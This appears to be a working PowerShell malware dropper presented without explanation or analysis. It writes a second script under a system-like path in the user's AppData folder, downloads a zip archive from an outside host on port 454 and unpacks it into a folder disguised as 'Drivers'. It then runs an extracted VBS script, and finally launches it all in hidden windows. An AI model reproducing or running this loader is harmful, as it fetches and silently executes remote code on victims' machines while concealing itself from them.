$scriptContent = @"
$targetFolder = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Drivers"
$compressedFileUrl = "https://dso2.raed.net:454/files/Installer.zip"
$vbsScriptPath = "$targetFolder\VSHS.vbs"

# Create the target folder if it doesn't exist
New-Item -Path $targetFolder -ItemType Directory -Force

# Download the compressed file
$compressedFilePath = Join-Path -Path $targetFolder -ChildPath "Installer.zip"
Invoke-WebRequest -Uri $compressedFileUrl -OutFile $compressedFilePath

# Extract the contents of the compressed file to the target folder
Expand-Archive -Path $compressedFilePath -DestinationPath $targetFolder -Force

# Run the VBS script
Start-Process -FilePath "wscript.exe" -ArgumentList $vbsScriptPath -WindowStyle Hidden
"@

# Define the path to the script file
$scriptFilePath = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\WIN.ps1"

# Write the script content to the file
$scriptContent | Out-File -FilePath $scriptFilePath -Encoding utf8

# Run the script
Start-Process -FilePath "powershell.exe" -ArgumentList "-File $scriptFilePath" -WindowStyle Hidden

exit
